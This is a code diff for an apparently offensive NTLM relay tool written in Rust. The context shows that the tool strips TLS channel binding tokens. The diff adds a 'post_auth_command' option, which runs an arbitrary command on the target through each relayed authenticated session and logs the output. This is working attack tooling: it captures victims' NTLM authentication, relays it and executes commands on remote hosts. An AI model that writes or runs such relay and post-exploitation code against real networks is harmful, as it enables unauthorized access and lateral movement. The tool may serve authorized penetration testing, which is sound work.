@@ -62,6 +62,8 @@ pub struct TlsRelayConfig {
     /// - `Passthrough`: forwards CBT unchanged
     /// - `Validate`: validates CBT against TLS session params (non-relay use)
     pub cbt_mode: CbtMode,
+    /// Command executed on relayed sessions (see `RelayConfig::post_auth_command`).
+    pub post_auth_command: Option<String>,
 }
 
 /// Channel binding token handling mode.
@@ -91,6 +93,7 @@ impl Default for TlsRelayConfig {
             max_retries: 3,
             timeout_secs: 30,
             cbt_mode: CbtMode::Strip,
+            post_auth_command: None,
         }
     }
 }
@@ -296,6 +299,7 @@ impl TlsRelay {
             max_connections: 64,
             tls_config: None,
             socks5_proxy: self.config.socks5_proxy.clone(),
+            post_auth_command: self.config.post_auth_command.clone(),
         };
         let relay = Arc::new(TokioMutex::new(NtlmRelay::new(relay_config)));
 
@@ -509,6 +513,12 @@ async fn handle_tls_client(
         .remove(&client_ip)
         .ok_or_else(|| RelayError::Protocol("No pending relay state for client".into()))?;
 
+    let relay_config_read = bridge.relay.clone();
+    let post_cmd = bridge
+        .handle
+        .clone()
+        .block_on(async move { relay_config_read.lock().await.post_auth_command() });
+
     let session = bridge.handle.block_on(async {
         let mut guard = bridge.relay.lock().await;
         guard
@@ -517,11 +527,28 @@ async fn handle_tls_client(
     });
 
     match session {
-        Ok(session) => {
+        Ok(mut session) => {
             info!(
                 "TLS relay succeeded: {}\\{} -> {}://{}",
                 session.domain, session.username, session.target.protocol, session.target.address
             );
+            if let Some(cmd) = post_cmd {
+                match bridge.handle.block_on(async {
+                    crate::relay::run_post_auth_command(&mut session, &cmd).await
+                }) {
+                    Ok(output) => {
+                        for line in output.lines() {
+                            info!("Post-auth ({}): {}", cmd, line);
+                        }
+                    }
+                    Err(err) => {
+                        warn!(
+                            "Post-auth command failed on {}: {}",
+                            session.target.address, err
+                        );
+                    }
+                }
+            }
             let resp = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
             let _ = tls_stream.write_all(resp.as_bytes()).await;
             Ok(())
@@ -726,6 +753,7 @@ mod tests {
             max_retries: 5,
             timeout_secs: 60,
             cbt_mode: CbtMode::Validate,
+            post_auth_command: None,
         };
         assert_eq!(config.listen_ip, "10.0.0.1");
         assert_eq!(config.listen_port, 8443);
